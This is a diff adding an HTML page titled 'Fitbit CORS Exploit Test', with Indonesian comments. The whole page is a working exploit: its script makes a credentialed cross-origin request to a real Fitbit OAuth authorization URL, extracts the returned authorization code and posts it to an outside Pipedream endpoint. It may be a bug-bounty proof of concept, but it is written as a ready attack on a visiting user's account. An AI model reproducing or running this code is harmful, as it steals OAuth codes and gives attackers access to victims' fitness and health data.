@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Fitbit CORS Exploit Test</h1>
+<script>
+(async () => {
+  const target = "https://strava.fitbit.com/auth/fitbit?client_id=228YHF&response_type=code&redirect_uri=https%3a%2f%2fv1.mywellness.com%2fcloud%2fthirdpartiesactivity%2ffitbit%2freturnuri&scope=activity+nutrition+weight+respiratory_rate+sleep+oxygen_saturation+profile+heartrate+cardio_fitness";
+  
+  try {
+    const res = await fetch(target, {
+      credentials: "include",
+      mode: "cors"
+    });
+    const text = await res.text();
+
+    // Cari kode OAuth di respon
+    const match = text.match(/code=([a-zA-Z0-9]+)/);
+    if (match) {
+      const code = match[1];
+      console.log("OAuth code ditemukan:", code);
+
+      // Kirim ke Pipedream
+      await fetch("https://eoqb3e0qi0vy2sc.m.pipedream.net", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ code })
+      });
+    } else {
+      console.log("Tidak ada OAuth code di respon");
+    }
+  } catch (e) {
+    console.error("Error:", e);
+  }
+})();
+</script>
+</body>
+</html>
+
